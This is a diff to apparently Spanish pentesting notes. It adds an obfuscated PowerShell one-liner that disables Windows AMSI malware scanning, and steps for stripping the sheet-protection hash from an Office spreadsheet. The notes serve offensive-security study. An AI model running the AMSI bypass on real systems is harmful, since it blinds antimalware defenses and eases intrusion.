@@ -21,6 +21,12 @@ $field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
 $field.SetValue($null,$true)
 ```
 
+```null
+PS C:\Users\Sierra.Frye\Documents> 
+
+$a='si';$b='Am';$Ref=[Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils'-f $b,$a)); $z=$Ref.GetField(('am{0}InitFailed'-f$a),'NonPublic,Static');$z.SetValue($null,$true)
+```
+
 ## Obtención de hash NetNTLMv2 con Windows Defender
 
 ```null
@@ -118,3 +124,18 @@ En este ejemplo con la cadena ```/test```
 '/test'
 ```
 
+### Cifrado documentos Office
+
+Al descomprimir el documento, se puede eliminar el hash que contiene a la contraseña
+
+```null
+unzip Desktop_Phishing_Attempt.xlsx
+```
+
+```null
+<sheetProtection algorithmName="SHA-512" hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg=="
+```
+
+```null
+zip -r Desktop_Phishing_Attempt.xlsx *
+```
